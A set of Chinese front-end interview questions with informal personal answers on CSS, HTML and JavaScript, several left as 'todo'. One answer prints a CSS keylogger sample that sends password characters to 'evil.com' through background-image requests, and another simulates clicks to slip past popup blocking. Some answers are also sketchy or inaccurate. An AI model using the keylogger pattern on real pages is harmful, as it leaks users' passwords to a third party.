# 29、使用css的attr()写一个类似a标签title的提示框

html

# 30、举例说明如何从html元素继承box-sizing？

*, *::before, *::after {
  box-sizing: inherit;
}

html {
  box-sizing: border-box;
}

# 31、异步加载CSS的方式有哪些？

旧：
js动态插入link标签

在link标签上设置media属性为低优先级的 print,文档渲染后改为screen

新:
<link rel="preload" href="cssfile.css" as="style" onload="this.rel='stylesheet'">
改rel值，只有谷歌完美兼容

# 32、css的加载会阻塞DOM树解析和渲染吗？为什么？

css加载不会阻止dom数的解析，但是会阻止dom树的渲染，因为css下载完成后解析成cssom与dom生成渲染数后，页面才会渲染，绘制出来

# 33、css的加载会阻塞js运行吗？为什么？

会阻塞js的运行，因为js可能会去获取或者改变元素样式，所以浏览器为了不重复渲染，等所有css加载渲染完成后再执行js

# 34、为了减小css文件的大小，怎么去除无用css呢？有哪些方法？

使用 purgeCss 插件进行清理

# 35、在一个项目里，你是如何组织(架构)css代码的？

todo

# 36、使用纯css能否监控到用户的一些信息？怎么实现？

可以，著名的css keylogger：

input[type="password"][value$="a"] {
  background-image: url("http://evil.com/api/a");
}

input[type="password"][value$="b"] {
  background-image: url("http://evil.com/api/b");
}

input[type="password"][value$="c"] {
  background-image: url("http://evil.com/api/c");
}

# 37、请使用css3实现图片的平滑转换

以全局监听的方式通过 a 标签的描点进行 view 动态切换页面，只要把 a 标签带有 id 的 href 属性的值指到锚点，用 CSS3 的动画进行切换页面.

# 38、使用css画个钟表的时间刻度

思路：定义一个钟表的大小位置，用absolute

从 1点到12点用 ul li，每个li用 nth-child 来控制位置，角度用transform，然后分钟的刻度也是照样子分别控制位置，要用48个li

# 39、ui设计中px、pt、ppi、dpi、dp、sp之间的关系？

px 电子屏幕上组成一幅图画或者照片的基本单元
pt 英寸
ppi 英寸像素数
dpi 每英寸多少点
dp 安卓开发用的长度单位
sp 安卓开发用的字体大小单位

# 40、举例说明shape-outside的属性的用途有哪些？

shape-outside 定义了一个可以是非矩形的形状，相邻的内联内容应围绕该形状进行包装 

shape-outside：circle() 属性可以实现文字圆形环绕图片效果

# 41、用css3画出一个立体魔方

todo

# 42、如何重写行内样式？方法有哪些（至少两种）？

1、！important
2、var divStyle = document.querySelector('#div').style // 修改属性

# 43、有哪些标签是不支持伪元素的？

伪元素有：

::after 
::before
::first-letter
::first-line

::selection
::backdrop

img input iframe 不支持这样用的，因为需要这些元素是可以插入内容的


# 44、请使用纯css实现波浪效果

todo

# 45、请问class与[class=xxx]的区别是什么？两者是否等价？

不等价
class是类选择器，可以作用于任何dom元素
[class=xxx]是属性选择器，只能作用于特定类型的dom元素

# 46、为什么说对opacity进行动画要比box-shadow进行动画性能更好呢？

opacity不会影响布局，也需要重绘

# 47、能不能使用纯css使你的浏览器卡死？怎么实现？

可以，用计算属性calc、变量

# 48、如何使用css实现鼠标跟随？

其实很多 CSS 效果，都离不开 障眼法 二字。要监测到当前鼠标处于何处，我们只需要在页面上铺满元素即可：

https://www.php.cn/css-tutorial-453627.html

# 49、你有使用过css的属性background-blend-mode吗？说说它的运用场景有哪些？

背景混合模式

可以是背景图片与背景图片的混合，

也可以是背景图片和背景色的之间的混合。

https://blog.csdn.net/dwb123456123456/article/details/84563367

# 50、用css3实现文字发光的效果

text-shadow：0 0 10px #fff,
0 0 20px #fff,
0 0 30px #fff,
0 0 40px #00a67c,

周级综合题目（50）

# 1、你所在的团队有规范吗？举例说明都定义了哪些规范？

1、命名使用驼峰命名法；
2、项目使用ts强语法编写；
3、代码风格使用eslint检测；
4、编写的纯函数使用函数式编程；
5、遥遥无期的单元测试。。。

# 2、请描述下null和undefined的区别是什么？这两者分别运用在什么场景？

null 是“空值”，表示某个对象/资源并不存在

undefined 是指一个属性或变量还未赋值。

# 3、CSS的伪类和伪对象有什么不同？

    伪类：我们常用的比如，hover，focus等，我认为伪类是为了弥补选择器的不足。还有伪类选择器，比如first-child,nth-child.
    伪元素 : ::before ::after 是为了创建一个dom元素，使用content属性指定要插入的内容。content必须有值（空值也行）。还有 伪元素选择器，比如 first-line first-letter

# 4、请描述下元素的href和src有什么区别？

1.概念不同
href用于在当前文档和引用资源之间确立联系
src用于将资源替换当前元素
2.解析方式不同
href解析时，会并行下载资源且不会停止当前文档处理
src解析时，会暂停当前文档处理

# 5、浏览器在什么情况下会出现“已拦截弹窗式窗口”？怎么解决？

已拦截弹窗式窗口出现的原因是你想打开一个页面，但是这个页面并不是通过你的点击事件实现，而是已其他方式出现的。
使用模拟点击事件，

<script>
    setTimeout(function() {
       window.open('https://www.baidu.com');
    }, 300);
</script>


<script>
    function opens() {
        window.open('https://www.baidu.com');
    }
    document.body.addEventListener('click',opens); // 主动点击不被拦截
   // 模拟点击被拦截
   setTimeout(function () {
        document.body.dispatchEvent(new Event('click'));
    }, 500);
</script>

# 6、解释下为什么{} + [] === 0为true？

那个 {} 是空语句块而非空对象，{} 认定是语法块， 这个放在前面，只有混淆作用，并不参与运算。

{} + [] === 0

+[] === 0

0 === 0 

true

# 7、移动端的布局用过媒体查询吗？写出例子看看

@media(min-width: 501px) and (max-width: 901px) {
	body {
		color: red;
	}
}

# 8、简要描述下什么是DNS？它有什么用？


Domain Name System 域名系统
它将域名映射到 IP 地址。

解析域名,可以用来将 好记的网址 解析为 不好记的 IP地址

# 9、js的函数有哪几种调用形式？

- 自调用 (function())();
- 直接调用 fn()
- 做为对象的属性调用 obj.fn()
- 使用构造函数调用
new fn()
- 使用call或apply调用
fn.call() || fn.apply()

fn(arg1, arg2, ...)
fn.call(thisArg, arg1, arg2, ...)
fn.apply(thisArg, [arg1, arg2, ...])

其中，call 和 apply 使得函数内的 this 被绑定到 thisArg 上。

# 10、写出div在不固定高度的情况下水平垂直居中的方法？

1、flex

 .tith1 {
    display: flex;
    justify-content: center;
    align-items: center;
    background: red;
  }

  2、table

  text-align: center;
  width: 100%;
  display: table;

  3、

父盒子相对定位
子盒子绝对定位:
  position:absolute;
left:50%;
top:50%;
transform:translate(-50%,-50%);


父盒子相对定位，子盒子绝对定位和margin
position:absolute;
left:0;
top:0;
right:0;
bottom:0;
margin:auto;

# 11、有使用过svg吗？请用svg画一个圆

<svg width="50" height="50">
    <circle cx="25" cy="25" r="10" fill="black" />
</svg>

# 12、说说你对emoji表情的理解，前端如何处理emoji表情？它的运用场景有哪些？

说一个使用emoji遇到的问题吧，如果前端使用emoji保存入库，服务器使用mysql的情况下需要设置对应的字符集为【utf8mb4】支持该表情 。


# 13、用js写出死循环的方法有哪些？

无结束条件
递归


while

while (true) {

}

for

for (;;) {

}

# 14、为什么会出现浮动？在什么时候需要清除浮动呢？

1.为了实现文字环绕图片效果
2.父容器的高度塌陷时候,需要清除浮动

# 15、使用HTML5需要遵守哪些设计原则？

避免不必要的复杂性

支持已有内容

解决现实的问题

内容模型

平稳退化

# 16、你知道什么是图片防盗链吗？防盗链怎么实现呢？说说你的方法

盗链 是指在自己的页面上展示一些并不在自己服务器上的内容。通常的做法是通过技术手段获得它人服务器上的资源地址，绕过别人的资源展示页面，直接在自己的页面上向最终用户提供此内容。

防盗链 就是防止盗链。

# 17、分别写出数组的交集、并集、差集、补集这四个方法

const intersect = (a, b) => a.filter(i => b.includes(i)) // 交
const exclude = (a, b) => a.filter(i => !b.includes(i)) // 差
const union = (a, b) => exclude(a, b).concat(b) // 并
const unionAll = (a, b) => a.concat(b) // 重复并
const xor = (a, b) => exclude(a, b).concat(exclude(b, a)) // 补

# 18、当一个元素被设置为浮动后，它的display值变为什么呢？

一个元素被设为绝对定位或者浮动后，其display计算值就变为了block，尽管其表现形式和inline-block类似——包裹内部元素且不超出包含块的特性。按照如下方式在控制台尝试可验证：

var span = document.createElement('span');
document.body.appendChild(span);
console.log('1.' + window.getComputedStyle(span).display);
span.style.float = 'left';
console.log('2.' + window.getComputedStyle(span).display);
输出：
1.inline
2.block

# 19、HTML5标准提供了哪些新的API？你有用过哪些？


    两个选择器API
        document.querySelector()
        document.querySelectAll()
    地理定位API
        getCurrrentPosition()
    多媒体API
        <video></video>
        <audio></audio>
    拖放

<div ondrop="drop(event)" ondragover="allowDrop(event)"></div>
<div draggable="true" ondragstart="drag(event)"></div>

    文件
    window.requestFileSystem()
    XHR2

var xhr = new XMLHttpRequest();
xhr.open("POST", "@Url.Action("Upload")")

    本地存储API
        localStorage
        sessionStorage

    canvas

<canvas id="myCanvas" width="200" height="100">

    svg

<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
   <circle cx="100" cy="50" r="40" stroke="black" stroke-width="2" fill="red" />
</svg>

# 20、说说你对Git的branch, diff, merge的理解？

branch git分支相关操作，可用于查看、新建、删除分支以及分支的重命名操作
diff 用于对比两次修改的差异 可以通过自定义参数来指定对比哪两次修改
merge 用于合并分支或者某次提交 一般用于将分支或修改的内容合并到master上
三者都是git的基本操作指令

# 21、要实现一个js的持续动画，你有什么比较好的方法？

requestAnimationFrame，浏览器专门为js动画提供的API。

# 22、行内css和important哪个优先级高？

!important 

# 23、写出以下几个HTML标签：字体、居中、文字加粗、下标

现在这些标签都有相应的CSS属性进行设置了吧
字体：font
居中：text-align: center
文字加粗：font-weight: bold
下标：vertical-align:sub

# 24、你认为前端工程师应该分为哪些级别呢？说说你的看法

切图仔，页面仔，X架构,全栈，CTO

# 25、写例子说明如何给li绑定事件（ul下有1000+个li）？

$el.addeventlistener('click', function(e) {
	console.log(e.target)
})

# 26、如何更改placeholder的字体颜色和大小？

input::-webkit-input-placeholder {
      color: red;
    }

# 27、Doctype有什么作用？你知道有多少种Doctype文档类型吗？

用于标识该文件编写是基于哪个HTML版本的语法。

<-- html5-->
<!DOCTYPE html>

<-- html4-->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" 
"http://www.w3.org/TR/html4/frameset.dtd">


DOCTYPE声明指定了浏览器对于HTML文档解析的类型；

    HTML5的DOCTYPE只有一种：

<!DOCTYPE html>

    HTML4.01的DOCTYPE有三种：Strict，Transitional和Frameset；

# 28、不查资料，你会手写正则吗？

https://github.com/haizlin/fe-interview/issues/974


    ^：匹配以...开头的的字符串
    $：匹配以...结尾的的字符串
    ^和$同时使用：精确匹配
    []：匹配字符组的一个列表

# 29、说说你理解的同步和异步的区别是什么？

同步就是上一个任务结束下一个任务再开始，比如alert弹窗，你不点击确定他就会阻塞后边代码的执行；
异步就是按顺序开始（不可能同时开始）但是不一定按顺序结束，比如图片的加载就是走的异步。

# 30、移动端微信页面有哪些兼容性问题及解决方案是什么？

1.rem方案通过 reset js 进行适配
2.vw 方案 搭配px to viewport进行适配

# 31、列举出你最常用的meta标签的写法和作用 

背下来：https://github.com/haizlin/fe-interview/issues/971

# 32、你有用过单例模式吗？主要运用场景有哪些？

todo

# 33、不用第三方库，说说纯js怎么实现读取和导出excel？

 let blob = new Blob([res.data],{type: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"});
            let a = document.createElement('a')
            a.download = 'XXX.xlsx'
            a.href =URL.createObjectURL(blob) 
            document.body.appendChild(a)
            a.click()

# 34、你对视网膜(Retina)分辨率有了解吗？有没有在实际中使用过？

Retina分辨率指的是屏幕的物理分辨率达到了使得人眼难以看到单个物理像素；

具体应用应该就是dpr > 1的屏幕适配，需要根据不同dpr给出合适尺寸的图片；

设备像素比（dpr） = 设备像素（分辨率）/ 设备独立像素（屏幕尺寸）

# 35、HTML5的页面可见性（Page Visibility）有哪些应用场景？

document.visibilityState属性

产生的原因:

    不能触发unload,pageHide事件的时候，比如：
    手机端切换到最近任务界面,点击另一个APP,
    手机端直接按home键返回主屏幕;
    PC端最小化,



    停止与服务器的轮询
    停止页面音视频


属性值：字符串

  hidden：页面彻底不可见。
  visible：页面至少一部分可见。

触发的事件：

 document.onvisibilitychange
 document.addEventListener('visibilitychange',  ()=> {
  // 用户当前页面不可见（离开或者后端或者最小化，或者页签切换）
  if (document.visibilityState === 'hidden') {
    document.title = '页面不可见';
  }

  // 用户打开或回到页面
  if (document.visibilityState === 'visible') {
    document.title = '页面可见';
  }
});

页面卸载：
	
    页面可见时，用户强制关闭 Tab 页。
    页面可见时，（tab页签切换）。
    页面不可见时，用户或系统关闭浏览器窗口。

https://github.com/haizlin/fe-interview/issues/975


# 36、你有画过流程图吗？用过什么软件？开始和判定分别用什么图形表示？

processon。  开始使用圆角矩形，判定使用菱形。

# 37、分别封装精确运算的加减乘除四个方法

这个是真的难

https://github.com/haizlin/fe-interview/issues/981

# 38、如何让大小不同的图片等比缩放不变形显示在固定大小的div里？写个例子



    图片等比缩放 img{ object-fit: cover/contain;}

    div宽高比例固定，跟随屏幕变化而变化，利用padding垂直方向的属性来实现


# 39、 HTML5怎么为输入框添加语音输入的功能呢？

<input type=”text” speech x-webkit-speech />

非h5规范，服务需要走google的服务器

# 40、你有自己买过服务器和域名用来搭建博客或者网站吗？

# 40、不依赖第三方库，说下如何使用js读取pdf？

这个题目有两种解读：

    前端不使用第三方库，如何将 PDF 文件显示在网页上。
        现代桌面浏览器都自带 PDF viewer 插件的，用 <iframe src="file.pdf"> 就能显示。（embed应该也可以）

    前端不使用第三方库，如何读取并解析 PDF 格式，利用 HTML 技术渲染 PDF 文件内容？
        这个就是 pdf.js 干的事情。思路是使用 FileReader API 读取文件二进制内容，根据 PDF 文件规范解析内容（PDF 是开源格式），根据 PDF 文件描述的文档内容和布局，用 canvas 或者 DOM 展现出来。内嵌的 font 或图片可以提取二进制然后用 blob URL 搞定，难点是如何用 DOM 实现 PDF 格式描述的布局 (不清楚 PDF 是如何描述布局的)。

# 41、说说你对前端二倍图的理解？移动端使用二倍图比一倍图有什么好处？

二倍图是指单位面积下设备像素与css像素个数之比为 4 的位图。

移动端使用二倍图可以在Retina屏幕下保真展示。

# 42、说说你对accesskey的理解，举例说明它有什么运用场景？

制定快捷键触发对元素绑定的事件

# 43、进程与线程有什么区别？JS的单线程带来哪些好处？

一个程序必定包含>=1个进程，
一个进程必定包含>=1个线程，
进程之间不共享内存，每多一个进程就要多分配一定的内存。
多个线程共享内存，因此多线程可以提高程序的并发性。

JS单线程带来的好处：

JS主要是面向浏览器的，因此是和用户实时交互的，如果多线程执行的话，你无法确定同时开始的任务哪个会先结束，以网页加载为例，可能导致网页HTML结构已经加载好，但是CSS样式还未加载完成，导致用户浏览体验差。或者两个线程同时对一个DOM结点进行修改和删除操作，则无法判断以哪个线程为准。

# 44、准确说出'1,2,3,4'.split()的结果是什么（包括类型和值）？

运行结果为 ["1,2,3,4"]，是一个长度为1的Array，元素类型为String。
关于split函数，其可以接受两个参数，第一个参数是字符串或正则表达式，从该参数指定的地方分割 stringObject；但是第二个参数并不是说限制分割次数，而是限制返回Array的最大长度，举个例子：

let a = '1,2,3,4,5,6';
a.split(',', 3);  // 返回的结果为 ["1", "2", "3"]
a.split(',', 5);  // 返回的结果为 ["1", "2", "3", "4", "5"]

# 45、你是如何规划响应式布局的？

从项目角度来讲，
PC 和 Mobile 是一个项目还是两个项目；

从方法流派来讲，
有栅栏布局，固定 viewport，使用 rem/pt/vw 单位，使用定位百分比，修改为 rem/vw 单位，五种；

从文件结构来讲，
是独立为响应布局专用 css 文件，还是跟随组件一起；

其他细节，
用 flex-grow 的地方，用 % 的地方，用 em 的地方

# 46、行内元素、块级元素、空(void)元素分别有哪些？

行内元素

a, b, input, span, label, button, textarea...
块级元素

div, form, table, h1...h6, p
空元素

img, input, hr, br, meta, source,track

# 47、请列举出多种减少页面加载时间的方法 


缓存利用： 缓存 Ajax，使用 CDN、外部 JavaScript 和 css 文件缓存，添加 Expires 头，在服务器端配置 Etag，减少 DNS 查找等。
• 请求数量．合并样式和脚本，使用 css 图片精灵，初始首屏之外的图片资源按需加载，静态资源延迟加载。
• 请求带宽：压缩文件，开启 GZIP 。
• css 代码：避免使用 css 表达式、高级选择器、通配选择器 。
• JavaScript 代码：用散列表来优化查找，少用全局变量，用 innerHTML 代替 DOM 操作，减少 DOM 操作次数，优化 JavaScript 性能，用 setTimeout 避免页面失去响应，缓 存 DOM 节点查找的结果，避免使用 with (with 会创建自己的作用域， 增加作用域链的 长度），多个变量声明合并。
• HTML 代码：避免图片和 iFrame 等 src 属性为空 。 src 属性为空，会重新加载当前页面 ， 影响速度和效率 ， 尽量避免在 HTML 标签中写 Style 属性。


https://github.com/haizlin/fe-interview/issues/995


# 48、你是如何更好地处理Async/Await的异常的？

https://github.com/haizlin/fe-interview/issues/994

# 49、说说你对低版本IE的盒子模型的理解

IE盒子模型的宽高为content、padding、border之和

box-sizing: content-box; => W3C盒子宽高为content的宽高； 

box-sizing: border-box; => IE盒子宽高

# 50、请描述一下cookies、sessionStorage和localStorage的区别？

    cookie：存放于浏览器中的数据；常用于会话管理，用户设置，行为跟踪等。在js中可以通过document.cookie来进行设置，获取或删除等操作；不过cookie有许多明显的缺点：
        cookie的大小限制在4KB；
        cookie会伴随http请求一起被发送，会浪费网络带宽
        cookie的正确操作比较困难
    webStorage：H5新增的API，数据存放于客户端本地内存中；sessionStorage和localStorage操作一致，而sessionStorage的有效期限为一次session会话（即一个tab页从打开到关闭之间的时间段），localStorage是没有失效时间的（即永久保存，删除需要手动处理）；














